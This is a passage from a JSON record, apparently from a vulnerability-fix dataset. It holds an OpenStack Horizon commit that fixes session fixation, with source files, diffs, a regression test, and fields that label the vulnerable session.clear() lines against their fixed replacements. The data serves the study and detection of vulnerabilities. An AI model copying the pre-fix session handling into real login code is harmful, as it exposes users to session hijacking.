National Aeronautics and Space Administration.\n# All Rights Reserved.\n#\n# Copyright 2012 Nebula, Inc.\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http:\/\/www.apache.org\/licenses\/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n\n\"\"\"\nForms used for Horizon's auth mechanisms.\n\"\"\"\n\nimport logging\n\nfrom django import shortcuts\nfrom django.conf import settings\nfrom django.contrib import messages\nfrom django.contrib.auth import REDIRECT_FIELD_NAME\nfrom django.utils.translation import ugettext as _\nfrom keystoneclient import exceptions as keystone_exceptions\n\nfrom horizon import api\nfrom horizon import base\nfrom horizon import exceptions\nfrom horizon import forms\nfrom horizon import users\n\n\nLOG = logging.getLogger(__name__)\n\n\ndef _set_session_data(request, token):\n    request.session['serviceCatalog'] = token.serviceCatalog\n    request.session['tenant'] = token.tenant['name']\n    request.session['tenant_id'] = token.tenant['id']\n    request.session['token'] = token.id\n    request.session['user_name'] = token.user['name']\n    request.session['user_id'] = token.user['id']\n    request.session['roles'] = token.user['roles']\n\n\nclass Login(forms.SelfHandlingForm):\n    \"\"\" Form used for logging in a user.\n\n    Handles authentication with Keystone, choosing a tenant, and fetching\n    a scoped token token for that tenant. Redirects to the URL returned\n    by :meth:`horizon.get_user_home` if successful.\n\n    Subclass of :class:`~horizon.forms.SelfHandlingForm`.\n    \"\"\"\n    region = forms.ChoiceField(label=_(\"Region\"), required=False)\n    username = forms.CharField(label=_(\"User Name\"))\n    password = forms.CharField(label=_(\"Password\"),\n                               widget=forms.PasswordInput(render_value=False))\n\n    def __init__(self, *args, **kwargs):\n        super(Login, self).__init__(*args, **kwargs)\n        # FIXME(gabriel): When we switch to region-only settings, we can\n        # remove this default region business.\n        default_region = (settings.OPENSTACK_KEYSTONE_URL, \"Default Region\")\n        regions = getattr(settings, 'AVAILABLE_REGIONS', [default_region])\n        self.fields['region'].choices = regions\n        if len(regions) == 1:\n            self.fields['region'].initial = default_region[0]\n            self.fields['region'].widget = forms.widgets.HiddenInput()\n\n    def handle(self, request, data):\n        # For now we'll allow fallback to OPENSTACK_KEYSTONE_URL if the\n        # form post doesn't include a region.\n        endpoint = data.get('region', None) or settings.OPENSTACK_KEYSTONE_URL\n        region_name = dict(self.fields['region'].choices)[endpoint]\n        request.session['region_endpoint'] = endpoint\n        request.session['region_name'] = region_name\n\n        redirect_to = request.REQUEST.get(REDIRECT_FIELD_NAME, \"\")\n\n        if data.get('tenant', None):\n            try:\n                token = api.token_create(request,\n                                         data.get('tenant'),\n                                         data['username'],\n                                         data['password'])\n                tenants = api.tenant_list_for_token(request, token.id)\n            except:\n                msg = _('Unable to authenticate for that project.')\n                exceptions.handle(request,\n                                  message=msg,\n                                  escalate=True)\n            _set_session_data(request, token)\n            user = users.get_user_from_request(request)\n            redirect = redirect_to or base.Horizon.get_user_home(user)\n            return shortcuts.redirect(redirect)\n\n        elif data.get('username', None):\n            try:\n                unscoped_token = api.token_create(request,\n                                                  '',\n                                                  data['username'],\n                                                  data['password'])\n            except keystone_exceptions.Unauthorized:\n                exceptions.handle(request,\n                                  _('Invalid user name or password.'))\n            except:\n                # If we get here we don't want to show a stack trace to the\n                # user. However, if we fail here, there may be bad session\n                # data that's been cached already.\n                request.session.clear()\n                exceptions.handle(request,\n                                  message=_(\"An error occurred authenticating.\"\n                                            \" Please try again later.\"),\n                                  escalate=True)\n\n            # Unscoped token\n            request.session['unscoped_token'] = unscoped_token.id\n            request.user.username = data['username']\n\n            # Get the tenant list, and log in using first tenant\n            # FIXME (anthony): add tenant chooser here?\n            try:\n                tenants = api.tenant_list_for_token(request, unscoped_token.id)\n            except:\n                exceptions.handle(request)\n                tenants = []\n\n            # Abort if there are no valid tenants for this user\n            if not tenants:\n                messages.error(request,\n                               _('You are not authorized for any projects.') %\n                                {\"user\": data['username']},\n                               extra_tags=\"login\")\n                return\n\n            # Create a token.\n            # NOTE(gabriel): Keystone can return tenants that you're\n            # authorized to administer but not to log into as a user, so in\n            # the case of an Unauthorized error we should iterate through\n            # the tenants until one succeeds or we've failed them all.\n            while tenants:\n                tenant = tenants.pop()\n                try:\n                    token = api.token_create_scoped(request,\n                                                    tenant.id,\n                                                    unscoped_token.id)\n                    break\n                except:\n                    # This will continue for recognized Unauthorized\n                    # exceptions from keystoneclient.\n                    exceptions.handle(request, ignore=True)\n                    token = None\n            if token is None:\n                raise exceptions.NotAuthorized(\n                    _(\"You are not authorized for any available projects.\"))\n\n            _set_session_data(request, token)\n            user = users.get_user_from_request(request)\n        redirect = redirect_to or base.Horizon.get_user_home(user)\n        return shortcuts.redirect(redirect)\n\n\nclass LoginWithTenant(Login):\n    \"\"\"\n    Exactly like :class:`.Login` but includes the tenant id as a field\n    so that the process of choosing a default tenant is bypassed.\n    \"\"\"\n    region = forms.ChoiceField(required=False)\n    username = forms.CharField(max_length=\"20\",\n                       widget=forms.TextInput(attrs={'readonly': 'readonly'}))\n    tenant = forms.CharField(widget=forms.HiddenInput())\n"}},"msg":"Fixes lp978896 -- Session fixation security fix\n\nRotates session tokens on logout, and properly clears sessions\nto prevent data leakage.\n\nChange-Id: I52d03576d07b1e023a7730857156d0da1887b1df"}},"https:\/\/github.com\/openstack-archive\/deb-horizon":{"041b1c44c7d6cf5429505067c32f8f35166a8bab":{"url":"https:\/\/api.github.com\/repos\/openstack-archive\/deb-horizon\/commits\/041b1c44c7d6cf5429505067c32f8f35166a8bab","html_url":"https:\/\/github.com\/openstack-archive\/deb-horizon\/commit\/041b1c44c7d6cf5429505067c32f8f35166a8bab","sha":"041b1c44c7d6cf5429505067c32f8f35166a8bab","keyword":"session fixation prevent","diff":"diff --git a\/horizon\/exceptions.py b\/horizon\/exceptions.py\nindex 7af8a0a69..778719e3d 100644\n--- a\/horizon\/exceptions.py\n+++ b\/horizon\/exceptions.py\n@@ -203,7 +203,7 @@ class indicating the type of exception that was encountered will be\n     if issubclass(exc_type, UNAUTHORIZED):\n         if ignore:\n             return NotAuthorized\n-        request.session.clear()\n+        request.user_logout()\n         if not handled:\n             LOG.debug(\"Unauthorized: %s\" % exc_value)\n             # We get some pretty useless error messages back from\ndiff --git a\/horizon\/middleware.py b\/horizon\/middleware.py\nindex f20c1f09e..f141ff362 100644\n--- a\/horizon\/middleware.py\n+++ b\/horizon\/middleware.py\n@@ -49,6 +49,15 @@ def process_request(self, request):\n \n         Adds a :class:`~horizon.users.User` object to ``request.user``.\n         \"\"\"\n+        # A quick and dirty way to log users out\n+        def user_logout(request):\n+            if hasattr(request, '_cached_user'):\n+                del request._cached_user\n+            # Use flush instead of clear, so we rotate session keys in\n+            # addition to clearing all the session data\n+            request.session.flush()\n+        request.__class__.user_logout = user_logout\n+\n         request.__class__.user = users.LazyUser()\n         request.horizon = {'dashboard': None, 'panel': None}\n \ndiff --git a\/horizon\/tests\/auth_tests.py b\/horizon\/tests\/auth_tests.py\nindex ba1647777..9f295d0c0 100644\n--- a\/horizon\/tests\/auth_tests.py\n+++ b\/horizon\/tests\/auth_tests.py\n@@ -18,6 +18,8 @@\n #    License for the specific language governing permissions and limitations\n #    under the License.\n \n+import time\n+\n from django import http\n from django.core.urlresolvers import reverse\n from keystoneclient import exceptions as keystone_exceptions\n@@ -220,3 +222,53 @@ def test_logout(self):\n \n         self.assertRedirectsNoFollow(res, reverse('splash'))\n         self.assertNotIn(KEY, self.client.session)\n+\n+    def test_session_fixation(self):\n+        session_ids = []\n+        form_data = {'method': 'Login',\n+                     'region': 'http:\/\/localhost:5000\/v2.0',\n+                     'password': self.user.password,\n+                     'username': self.user.name}\n+\n+        self.mox.StubOutWithMock(api, 'token_create')\n+        self.mox.StubOutWithMock(api, 'tenant_list_for_token')\n+        self.mox.StubOutWithMock(api, 'token_create_scoped')\n+\n+        aToken = self.tokens.unscoped_token\n+        bToken = self.tokens.scoped_token\n+\n+        api.token_create(IsA(http.HttpRequest), \"\", self.user.name,\n+                         self.user.password).AndReturn(aToken)\n+        api.tenant_list_for_token(IsA(http.HttpRequest),\n+                                  aToken.id).AndReturn([self.tenants.first()])\n+        api.token_create_scoped(IsA(http.HttpRequest),\n+                                self.tenant.id,\n+                                aToken.id).AndReturn(bToken)\n+\n+        api.token_create(IsA(http.HttpRequest), \"\", self.user.name,\n+                         self.user.password).AndReturn(aToken)\n+        api.tenant_list_for_token(IsA(http.HttpRequest),\n+                                  aToken.id).AndReturn([self.tenants.first()])\n+        api.token_create_scoped(IsA(http.HttpRequest),\n+                                self.tenant.id,\n+                                aToken.id).AndReturn(bToken)\n+        self.mox.ReplayAll()\n+\n+        res = self.client.get(reverse('horizon:auth_login'))\n+        self.assertEqual(res.cookies.get('sessionid'), None)\n+        res = self.client.post(reverse('horizon:auth_login'), form_data)\n+        session_ids.append(res.cookies['sessionid'].value)\n+\n+        self.assertEquals(self.client.session['user_name'],\n+                          self.user.name)\n+        self.client.session['foobar'] = 'MY TEST VALUE'\n+        res = self.client.get(reverse('horizon:auth_logout'))\n+        session_ids.append(res.cookies['sessionid'].value)\n+        self.assertEqual(len(self.client.session.items()), 0)\n+        # Sleep for 1 second so the session values are different if\n+        # using the signed_cookies backend.\n+        time.sleep(1)\n+        res = self.client.post(reverse('horizon:auth_login'), form_data)\n+        session_ids.append(res.cookies['sessionid'].value)\n+        # Make sure all 3 session id values are different\n+        self.assertEqual(len(session_ids), len(set(session_ids)))\ndiff --git a\/horizon\/users.py b\/horizon\/users.py\nindex f5dcde81a..6e6be8e5a 100644\n--- a\/horizon\/users.py\n+++ b\/horizon\/users.py\n@@ -59,7 +59,7 @@ def get_user_from_request(request):\n         # If any of those keys are missing from the session it is\n         # overwhelmingly likely that we're dealing with an outdated session.\n         LOG.exception(\"Error while creating User from session.\")\n-        request.session.clear()\n+        request.user_logout()\n         raise exceptions.NotAuthorized(_(\"Your session has expired. \"\n                                          \"Please log in again.\"))\n \ndiff --git a\/horizon\/views\/auth.py b\/horizon\/views\/auth.py\nindex b48f24a65..5120eed76 100644\n--- a\/horizon\/views\/auth.py\n+++ b\/horizon\/views\/auth.py\n@@ -96,6 +96,6 @@ def switch_tenants(request, tenant_id):\n \n def logout(request):\n     \"\"\" Clears the session and logs the current user out. \"\"\"\n-    request.session.clear()\n+    request.user_logout()\n     # FIXME(gabriel): we don't ship a view named splash\n     return shortcuts.redirect('splash')\ndiff --git a\/horizon\/views\/auth_forms.py b\/horizon\/views\/auth_forms.py\nindex 287448685..2ebecfcda 100644\n--- a\/horizon\/views\/auth_forms.py\n+++ b\/horizon\/views\/auth_forms.py\n@@ -77,6 +77,16 @@ def __init__(self, *args, **kwargs):\n             self.fields['region'].widget = forms.widgets.HiddenInput()\n \n     def handle(self, request, data):\n+        if 'user_name' in request.session:\n+            if request.session['user_name'] != data['username']:\n+                # To avoid reusing another user's session, create a\n+                # new, empty session if the existing session\n+                # corresponds to a different authenticated user.\n+                request.session.flush()\n+        # Always cycle the session key when viewing the login form to\n+        # prevent session fixation\n+        request.session.cycle_key()\n+\n         # For now we'll allow fallback to OPENSTACK_KEYSTONE_URL if the\n         # form post doesn't include a region.\n         endpoint = data.get('region', None) or settings.OPENSTACK_KEYSTONE_URL\n@@ -116,7 +126,7 @@ def handle(self, request, data):\n                 # If we get here we don't want to show a stack trace to the\n                 # user. However, if we fail here, there may be bad session\n                 # data that's been cached already.\n-                request.session.clear()\n+                request.user_logout()\n                 exceptions.handle(request,\n                                   message=_(\"An error occurred authenticating.\"\n                                             \" Please try again later.\"),\n","message":"","files":{"\/horizon\/exceptions.py":{"changes":[{"diff":"\n     if issubclass(exc_type, UNAUTHORIZED):\n         if ignore:\n             return NotAuthorized\n-        request.session.clear()\n+        request.user_logout()\n         if not handled:\n             LOG.debug(\"Unauthorized: %s\" % exc_value)\n             # We get some pretty useless error messages back from","add":1,"remove":1,"filename":"\/horizon\/exceptions.py","badparts":["        request.session.clear()"],"goodparts":["        request.user_logout()"]},{"diff":"\n     if issubclass(exc_type, UNAUTHORIZED):\n         if ignore:\n             return NotAuthorized\n-        request.session.clear()\n+        request.user_logout()\n         if not handled:\n             LOG.debug(\"Unauthorized: %s\" % exc_value)\n             # We get some pretty useless error messages back from","add":1,"remove":1,"filename":"\/horizon\/exceptions.py","badparts":["        request.session.clear()"],"goodparts":["        request.user_logout()"]}],"source":"\n \"\"\" Exceptions raised by the Horizon code and the machinery for handling them. \"\"\" import logging import sys from django.conf import settings from django.contrib import messages from django.utils.translation import ugettext as _ from cloudfiles import errors as swiftclient from glanceclient.common import exceptions as glanceclient from keystoneclient import exceptions as keystoneclient from novaclient import exceptions as novaclient LOG=logging.getLogger(__name__) class HorizonException(Exception): \"\"\" Base exception class for distinguishing our own exception classes. \"\"\" pass class Http302(HorizonException): \"\"\" Error class which can be raised from within a handler to cause an early bailout and redirect at the middleware level. \"\"\" status_code=302 def __init__(self, location, message=None): self.location=location self.message=message class NotAuthorized(HorizonException): \"\"\" Raised whenever a user attempts to access a resource which they do not have role-based access to(such as when failing the :func:`~horizon.decorators.require_roles` decorator). The included:class:`~horizon.middleware.HorizonMiddleware` catches ``NotAuthorized`` and handles it gracefully by displaying an error message and redirecting the user to a login page. \"\"\" status_code=401 class NotAuthenticated(HorizonException): \"\"\" Raised when a user is trying to make requests and they are not logged in. The included:class:`~horizon.middleware.HorizonMiddleware` catches ``NotAuthenticated`` and handles it gracefully by displaying an error message and redirecting the user to a login page. \"\"\" status_code=403 class NotFound(HorizonException): \"\"\" Generic error to replace all \"Not Found\"-type API errors. \"\"\" status_code=404 class RecoverableError(HorizonException): \"\"\" Generic error to replace any \"Recoverable\"-type API errors. \"\"\" status_code=100 class ServiceCatalogException(HorizonException): \"\"\" Raised when a requested service is not available in the ``ServiceCatalog`` returned by Keystone. \"\"\" def __init__(self, service_name): message='Invalid service catalog service: %s' % service_name super(ServiceCatalogException, self).__init__(message) class AlreadyExists(HorizonException): \"\"\" Exception to be raised when trying to create an API resource which already exists. \"\"\" def __init__(self, name, resource_type): self.attrs={\"name\": name, \"resource\": resource_type} self.msg='A %(resource)s with the name \"%(name)s\" already exists.' def __repr__(self): return self.msg % self.attrs def __unicode__(self): return _(self.msg) % self.attrs class HandledException(HorizonException): \"\"\" Used internally to track exceptions that have gone through :func:`horizon.exceptions.handle` more than once. \"\"\" def __init__(self, wrapped): self.wrapped=wrapped HORIZON_CONFIG=getattr(settings, \"HORIZON_CONFIG\",{}) EXCEPTION_CONFIG=HORIZON_CONFIG.get(\"exceptions\",{}) UNAUTHORIZED=(keystoneclient.Unauthorized, keystoneclient.Forbidden, novaclient.Unauthorized, novaclient.Forbidden, glanceclient.AuthorizationFailure, glanceclient.Unauthorized, swiftclient.AuthenticationFailed, swiftclient.AuthenticationError) UNAUTHORIZED +=tuple(EXCEPTION_CONFIG.get('unauthorized',[])) NOT_FOUND=(keystoneclient.NotFound, novaclient.NotFound, glanceclient.NotFound, swiftclient.NoSuchContainer, swiftclient.NoSuchObject) NOT_FOUND +=tuple(EXCEPTION_CONFIG.get('not_found',[])) RECOVERABLE=(keystoneclient.ClientException, keystoneclient.AuthorizationFailure, novaclient.ClientException, glanceclient.ClientException, swiftclient.Error, AlreadyExists) RECOVERABLE +=tuple(EXCEPTION_CONFIG.get('recoverable',[])) def handle(request, message=None, redirect=None, ignore=False, escalate=False): \"\"\" Centralized error handling for Horizon. Because Horizon consumes so many different APIs with completely different ``Exception`` types, it's necessary to have a centralized place for handling exceptions which may be raised. Exceptions are roughly divided into 3 types: problems. These result in being logged out and sent to the login screen. located via the API. These generally result in a user-facing error message, but are otherwise returned to the normal code flow. Optionally a redirect value may be passed to the error handler so users are returned to a different view than the one requested in addition to the error message. but drop directly back to the regular code flow. All other exceptions bubble the stack as normal unless the ``ignore`` argument is passed in as ``True``, in which case only unrecognized errors are bubbled. If the exception is not re-raised, an appropriate wrapper exception class indicating the type of exception that was encountered will be returned. \"\"\" exc_type, exc_value, exc_traceback=sys.exc_info() handled=issubclass(exc_type, HandledException) wrap=False if handled: exc_type, exc_value, exc_traceback=exc_value.wrapped wrap=True if issubclass(exc_type, HorizonException): message=exc_value elif message and \"%(exc)s\" in message: message=message %{\"exc\": exc_value} if issubclass(exc_type, UNAUTHORIZED): if ignore: return NotAuthorized request.session.clear() if not handled: LOG.debug(\"Unauthorized: %s\" % exc_value) fallback=_(\"Unauthorized. Please try logging in again.\") messages.error(request, message or fallback, extra_tags=\"login\") raise NotAuthorized if issubclass(exc_type, NOT_FOUND): wrap=True if not ignore and not handled: LOG.debug(\"Not Found: %s\" % exc_value) messages.error(request, message or exc_value) if redirect: raise Http302(redirect) if not escalate: return NotFound if issubclass(exc_type, RECOVERABLE): wrap=True if not ignore and not handled: LOG.debug(\"Recoverable error: %s\" % exc_value) messages.error(request, message or exc_value) if redirect: raise Http302(redirect) if not escalate: return RecoverableError if wrap: raise HandledException([exc_type, exc_value, exc_traceback]) raise exc_type, exc_value, exc_traceback ","sourceWithComments":"# vim: tabstop=4 shiftwidth=4 softtabstop=4\n\n# Copyright 2012 Nebula, Inc.\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http:\/\/www.apache.org\/licenses\/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n\n\"\"\"\nExceptions raised by the Horizon code and the machinery for handling them.\n\"\"\"\n\nimport logging\nimport sys\n\nfrom django.conf import settings\nfrom django.contrib import messages\nfrom django.utils.translation import ugettext as _\nfrom cloudfiles import errors as swiftclient\nfrom glanceclient.common import exceptions as glanceclient\nfrom keystoneclient import exceptions as keystoneclient\nfrom novaclient import exceptions as novaclient\n\n\nLOG = logging.getLogger(__name__)\n\n\nclass HorizonException(Exception):\n    \"\"\" Base exception class for distinguishing our own exception classes. \"\"\"\n    pass\n\n\nclass Http302(HorizonException):\n    \"\"\"\n    Error class which can be raised from within a handler to cause an\n    early bailout and redirect at the middleware level.\n    \"\"\"\n    status_code = 302\n\n    def __init__(self, location, message=None):\n        self.location = location\n        self.message = message\n\n\nclass NotAuthorized(HorizonException):\n    \"\"\"\n    Raised whenever a user attempts to access a resource which they do not\n    have role-based access to (such as when failing the\n    :func:`~horizon.decorators.require_roles` decorator).\n\n    The included :class:`~horizon.middleware.HorizonMiddleware` catches\n    ``NotAuthorized`` and handles it gracefully by displaying an error\n    message and redirecting the user to a login page.\n    \"\"\"\n    status_code = 401\n\n\nclass NotAuthenticated(HorizonException):\n    \"\"\"\n    Raised when a user is trying to make requests and they are not logged in.\n\n    The included :class:`~horizon.middleware.HorizonMiddleware` catches\n    ``NotAuthenticated`` and handles it gracefully by displaying an error\n    message and redirecting the user to a login page.\n    \"\"\"\n    status_code = 403\n\n\nclass NotFound(HorizonException):\n    \"\"\" Generic error to replace all \"Not Found\"-type API errors. \"\"\"\n    status_code = 404\n\n\nclass RecoverableError(HorizonException):\n    \"\"\" Generic error to replace any \"Recoverable\"-type API errors. \"\"\"\n    status_code = 100  # HTTP status code \"Continue\"\n\n\nclass ServiceCatalogException(HorizonException):\n    \"\"\"\n    Raised when a requested service is not available in the ``ServiceCatalog``\n    returned by Keystone.\n    \"\"\"\n    def __init__(self, service_name):\n        message = 'Invalid service catalog service: %s' % service_name\n        super(ServiceCatalogException, self).__init__(message)\n\n\nclass AlreadyExists(HorizonException):\n    \"\"\"\n    Exception to be raised when trying to create an API resource which\n    already exists.\n    \"\"\"\n    def __init__(self, name, resource_type):\n        self.attrs = {\"name\": name, \"resource\": resource_type}\n        self.msg = 'A %(resource)s with the name \"%(name)s\" already exists.'\n\n    def __repr__(self):\n        return self.msg % self.attrs\n\n    def __unicode__(self):\n        return _(self.msg) % self.attrs\n\n\nclass HandledException(HorizonException):\n    \"\"\"\n    Used internally to track exceptions that have gone through\n    :func:`horizon.exceptions.handle` more than once.\n    \"\"\"\n    def __init__(self, wrapped):\n        self.wrapped = wrapped\n\n\nHORIZON_CONFIG = getattr(settings, \"HORIZON_CONFIG\", {})\nEXCEPTION_CONFIG = HORIZON_CONFIG.get(\"exceptions\", {})\n\n\nUNAUTHORIZED = (keystoneclient.Unauthorized,\n                keystoneclient.Forbidden,\n                novaclient.Unauthorized,\n                novaclient.Forbidden,\n                glanceclient.AuthorizationFailure,\n                glanceclient.Unauthorized,\n                swiftclient.AuthenticationFailed,\n                swiftclient.AuthenticationError)\nUNAUTHORIZED += tuple(EXCEPTION_CONFIG.get('unauthorized', []))\n\nNOT_FOUND = (keystoneclient.NotFound,\n             novaclient.NotFound,\n             glanceclient.NotFound,\n             swiftclient.NoSuchContainer,\n             swiftclient.NoSuchObject)\nNOT_FOUND += tuple(EXCEPTION_CONFIG.get('not_found', []))\n\n\n# NOTE(gabriel): This is very broad, and may need to be dialed in.\nRECOVERABLE = (keystoneclient.ClientException,\n               # AuthorizationFailure is raised when Keystone is \"unavailable\".\n               keystoneclient.AuthorizationFailure,\n               novaclient.ClientException,\n               glanceclient.ClientException,\n               swiftclient.Error,\n               AlreadyExists)\nRECOVERABLE += tuple(EXCEPTION_CONFIG.get('recoverable', []))\n\n\ndef handle(request, message=None, redirect=None, ignore=False, escalate=False):\n    \"\"\" Centralized error handling for Horizon.\n\n    Because Horizon consumes so many different APIs with completely\n    different ``Exception`` types, it's necessary to have a centralized\n    place for handling exceptions which may be raised.\n\n    Exceptions are roughly divided into 3 types:\n\n    #. ``UNAUTHORIZED``: Errors resulting from authentication or authorization\n       problems. These result in being logged out and sent to the login screen.\n    #. ``NOT_FOUND``: Errors resulting from objects which could not be\n       located via the API. These generally result in a user-facing error\n       message, but are otherwise returned to the normal code flow. Optionally\n       a redirect value may be passed to the error handler so users are\n       returned to a different view than the one requested in addition to the\n       error message.\n    #. RECOVERABLE: Generic API errors which generate a user-facing message\n       but drop directly back to the regular code flow.\n\n    All other exceptions bubble the stack as normal unless the ``ignore``\n    argument is passed in as ``True``, in which case only unrecognized\n    errors are bubbled.\n\n    If the exception is not re-raised, an appropriate wrapper exception\n    class indicating the type of exception that was encountered will be\n    returned.\n    \"\"\"\n    exc_type, exc_value, exc_traceback = sys.exc_info()\n\n    # Because the same exception may travel through this method more than\n    # once (if it's re-raised) we may want to treat it differently\n    # the second time (e.g. no user messages\/logging).\n    handled = issubclass(exc_type, HandledException)\n    wrap = False\n\n    # Restore our original exception information, but re-wrap it at the end\n    if handled:\n        exc_type, exc_value, exc_traceback = exc_value.wrapped\n        wrap = True\n\n    # We trust messages from our own exceptions\n    if issubclass(exc_type, HorizonException):\n        message = exc_value\n    # If the message has a placeholder for the exception, fill it in\n    elif message and \"%(exc)s\" in message:\n        message = message % {\"exc\": exc_value}\n\n    if issubclass(exc_type, UNAUTHORIZED):\n        if ignore:\n            return NotAuthorized\n        request.session.clear()\n        if not handled:\n            LOG.debug(\"Unauthorized: %s\" % exc_value)\n            # We get some pretty useless error messages back from\n            # some clients, so let's define our own fallback.\n            fallback = _(\"Unauthorized. Please try logging in again.\")\n            messages.error(request, message or fallback, extra_tags=\"login\")\n        raise NotAuthorized  # Redirect handled in middleware\n\n    if issubclass(exc_type, NOT_FOUND):\n        wrap = True\n        if not ignore and not handled:\n            LOG.debug(\"Not Found: %s\" % exc_value)\n            messages.error(request, message or exc_value)\n        if redirect:\n            raise Http302(redirect)\n        if not escalate:\n            return NotFound  # return to normal code flow\n\n    if issubclass(exc_type, RECOVERABLE):\n        wrap = True\n        if not ignore and not handled:\n            LOG.debug(\"Recoverable error: %s\" % exc_value)\n            messages.error(request, message or exc_value)\n        if redirect:\n            raise Http302(redirect)\n        if not escalate:\n            return RecoverableError  # return to normal code flow\n\n    # If we've gotten here, time to wrap and\/or raise our exception.\n    if wrap:\n        raise HandledException([exc_type, exc_value, exc_traceback])\n    raise exc_type, exc_value, exc_traceback\n"},"\/horizon\/users.py":{"changes":[{"diff":"\n         # If any of those keys are missing from the session it is\n         # overwhelmingly likely that we're dealing with an outdated session.\n         LOG.exception(\"Error while creating User from session.\")\n-        request.session.clear()\n+        request.user_logout()\n         raise exceptions.NotAuthorized(_(\"Your session has expired. \"\n                                          \"Please log in again.\")","add":1,"remove":1,"filename":"\/horizon\/users.py","badparts":["        request.session.clear()"],"goodparts":["        request.user_logout()"]},{"diff":"\n         # If any of those keys are missing from the session it is\n         # overwhelmingly likely that we're dealing with an outdated session.\n         LOG.exception(\"Error while creating User from session.\")\n-        request.session.clear()\n+        request.user_logout()\n         raise exceptions.NotAuthorized(_(\"Your session has expired. \"\n                                          \"Please log in again.\")","add":1,"remove":1,"filename":"\/horizon\/users.py","badparts":["        request.session.clear()"],"goodparts":["        request.user_logout()"]}],"source":"\n \"\"\" Classes and methods related to user handling in Horizon. \"\"\" import logging from django.utils.translation import ugettext as _ from horizon import api from horizon import exceptions LOG=logging.getLogger(__name__) def get_user_from_request(request): \"\"\" Checks the current session and returns a:class:`~horizon.users.User`. If the session contains user data the User will be treated as authenticated and the:class:`~horizon.users.User` will have all its attributes set. If not, the:class:`~horizon.users.User` will have no attributes set. If the session contains invalid data, :exc:`~horizon.exceptions.NotAuthorized` will be raised. \"\"\" if 'user_id' not in request.session: return User() try: return User(id=request.session['user_id'], token=request.session['token'], user=request.session['user_name'], tenant_id=request.session['tenant_id'], tenant_name=request.session['tenant'], service_catalog=request.session['serviceCatalog'], roles=request.session['roles'], request=request) except KeyError: LOG.exception(\"Error while creating User from session.\") request.session.clear() raise exceptions.NotAuthorized(_(\"Your session has expired. \" \"Please log in again.\")) class LazyUser(object): def __get__(self, request, obj_type=None): if not hasattr(request, '_cached_user'): request._cached_user=get_user_from_request(request) return request._cached_user class User(object): \"\"\" The main user class which Horizon expects. .. attribute:: token The id of the Keystone token associated with the current user\/tenant. .. attribute:: username The name of the current user. .. attribute:: tenant_id The id of the Keystone tenant for the current user\/token. .. attribute:: tenant_name The name of the Keystone tenant for the current user\/token. .. attribute:: service_catalog The ``ServiceCatalog`` data returned by Keystone. .. attribute:: roles A list of dictionaries containing role names and ids as returned by Keystone. .. attribute:: admin Boolean value indicating whether or not this user has admin privileges. Internally mapped to:meth:`horizon.users.User.is_admin`. \"\"\" def __init__(self, id=None, token=None, user=None, tenant_id=None, service_catalog=None, tenant_name=None, roles=None, authorized_tenants=None, request=None): self.id=id self.token=token self.username=user self.tenant_id=tenant_id self.tenant_name=tenant_name self.service_catalog=service_catalog self.roles=roles or[] self._authorized_tenants=authorized_tenants self._request=request def is_authenticated(self): \"\"\" Evaluates whether this:class:`.User` instance has been authenticated. Returns ``True`` or ``False``. \"\"\" return self.token @property def admin(self): return self.is_admin() def is_admin(self): \"\"\" Evaluates whether this user has admin privileges. Returns ``True`` or ``False``. \"\"\" for role in self.roles: if role['name'].lower()=='admin': return True return False def get_and_delete_messages(self): \"\"\" Placeholder function for parity with ``django.contrib.auth.models.User``. \"\"\" return[] @property def authorized_tenants(self): if self.is_authenticated() and self._authorized_tenants is None: try: token=self._request.session.get(\"unscoped_token\", self.token) authd=api.tenant_list_for_token(self._request, token) except: authd=[] LOG.exception('Could not retrieve tenant list.') self._authorized_tenants=authd return self._authorized_tenants @authorized_tenants.setter def authorized_tenants(self, tenant_list): self._authorized_tenants=tenant_list ","sourceWithComments":"# vim: tabstop=4 shiftwidth=4 softtabstop=4\n\n# Copyright 2012 United States Government as represented by the\n# Administrator of the National Aeronautics and Space Administration.\n# All Rights Reserved.\n#\n# Copyright 2012 Nebula, Inc.\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http:\/\/www.apache.org\/licenses\/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n\"\"\"\nClasses and methods related to user handling in Horizon.\n\"\"\"\n\nimport logging\n\nfrom django.utils.translation import ugettext as _\n\nfrom horizon import api\nfrom horizon import exceptions\n\n\nLOG = logging.getLogger(__name__)\n\n\ndef get_user_from_request(request):\n    \"\"\" Checks the current session and returns a :class:`~horizon.users.User`.\n\n    If the session contains user data the User will be treated as\n    authenticated and the :class:`~horizon.users.User` will have all\n    its attributes set.\n\n    If not, the :class:`~horizon.users.User` will have no attributes set.\n\n    If the session contains invalid data,\n    :exc:`~horizon.exceptions.NotAuthorized` will be raised.\n    \"\"\"\n    if 'user_id' not in request.session:\n        return User()\n    try:\n        return User(id=request.session['user_id'],\n                    token=request.session['token'],\n                    user=request.session['user_name'],\n                    tenant_id=request.session['tenant_id'],\n                    tenant_name=request.session['tenant'],\n                    service_catalog=request.session['serviceCatalog'],\n                    roles=request.session['roles'],\n                    request=request)\n    except KeyError:\n        # If any of those keys are missing from the session it is\n        # overwhelmingly likely that we're dealing with an outdated session.\n        LOG.exception(\"Error while creating User from session.\")\n        request.session.clear()\n        raise exceptions.NotAuthorized(_(\"Your session has expired. \"\n                                         \"Please log in again.\"))\n\n\nclass LazyUser(object):\n    def __get__(self, request, obj_type=None):\n        if not hasattr(request, '_cached_user'):\n            request._cached_user = get_user_from_request(request)\n        return request._cached_user\n\n\nclass User(object):\n    \"\"\" The main user class which Horizon expects.\n\n    .. 